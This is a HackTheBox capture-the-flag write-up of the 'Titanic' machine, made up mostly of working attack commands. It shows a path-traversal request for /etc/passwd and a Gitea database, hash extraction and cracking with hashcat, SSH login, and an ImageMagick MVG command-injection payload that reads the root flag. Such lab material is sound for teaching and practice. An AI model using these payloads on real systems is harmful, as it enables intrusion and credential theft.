# Write-Up: Titanic Machine 🚢

![Titanic](https://img.shields.io/badge/Difficulty-Easy-green)  
![Titanic](https://img.shields.io/badge/Platform-HackTheBox-red)  
![Titanic](https://img.shields.io/badge/OS-Linux-blue)  

---

## Index 📚

1. [Introduction](#introduction-)
2. [Enumeration](#enumeration-)
3. [Exploitation](#exploitation-)
4. [Privilege Escalation](#privilege-escalation-)
5. [Conclusion](#conclusion-)

---

## Introduction 🎯

The **Titanic** machine is an **Easy**-difficulty **Linux** machine on HackTheBox. In this write-up, I will detail the exploitation process, from initial enumeration to obtaining the root flag. 🚩

---

## Enumeration 🔍

### 1. Port Scanning 🛠️

We start with a port scan using **Nmap**:

```bash
nmap -sC -sV -oN titanic.nmap 10.10.11.55
Result:

plaintext
Copy

PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 8.9p1 Ubuntu 3ubuntu0.10 (Ubuntu Linux; protocol 2.0)
80/tcp open  http    Apache httpd 2.x
Port 22: SSH (OpenSSH 8.9p1)

Port 80: HTTP (Apache 2.x)

2. Web Enumeration 🌐
Accessing http://titanic.htb, we find a simple website. An interesting endpoint is /book, which returns a JSON file after submitting a form. Using Burp Suite, we intercept the request and discover it redirects to /download?ticket=rand-id.json.

3. Local File Inclusion (LFI) 🕳️
We test for LFI by replacing rand-id.json with ../../../../etc/passwd:

bash
Copy
curl "http://titanic.htb/download?ticket=../../../../etc/passwd"
Result:

plaintext
Copy
root:x:0:0:root:/root:/bin/bash
developer:x:1000:1000:developer:/home/developer:/bin/bash
We confirm the site is vulnerable to LFI. We also extract /etc/hosts and find a subdomain:

plaintext
Copy
127.0.0.1   dev.titanic.htb
Exploitation 💣
1. Accessing Gitea 🐙
We visit http://dev.titanic.htb and find a Gitea instance. We register a new user and explore the repositories:

docker-config: Docker configuration.

flask-app: Flask application code.

2. Extracting the Gitea Database 🗃️
Using the LFI, we extract the Gitea database:

bash
Copy
curl -s "http://titanic.htb/download?ticket=/home/developer/gitea/data/gitea/gitea.db" -o gitea.db
We open the database with SQLite:

bash
Copy
sqlite3 gitea.db
sqlite> SELECT lower_name, passwd, salt FROM user;
We obtain the hash and salt for the developer user.

3. Cracking the Password 🔓
We use hashcat to crack the hash:

bash
Copy
hashcat -m 10900 gitea_hash.txt /usr/share/wordlists/rockyou.txt
We obtain the plaintext password. 🎉

4. SSH Access 🚪
We use the credentials to access via SSH:

bash
Copy
ssh developer@titanic.htb
We read the user flag:

bash
Copy
cat /home/developer/user.txt
Privilege Escalation ⬆️
1. Identifying Vulnerabilities 🕵️
We run sudo -l and find no direct privileges. We explore /opt and find a script called identify_images.sh that uses ImageMagick.

2. Exploiting ImageMagick 🖼️
The ImageMagick version is vulnerable to arbitrary code execution. We create a malicious .mvg file:

plaintext
Copy
push graphic-context
viewbox 0 0 640 480
fill 'url(https://example.com/image.png"|/bin/bash -c "cat /root/root.txt > /tmp/root.txt")'
pop graphic-context
We execute the script:

bash
Copy
/opt/scripts/identify_images.sh /tmp/exploit.mvg
3. Obtaining the Root Flag 🚩
We check the /tmp/root.txt file:

bash
Copy
cat /tmp/root.txt
Root flag obtained! 🎉

Conclusion 🏁
The Titanic machine demonstrates how an LFI can lead to the exposure of sensitive data (like a Gitea database) and, ultimately, privilege escalation through a vulnerability in ImageMagick.

Flags Captured 🚩

Happy Hacking! 🚀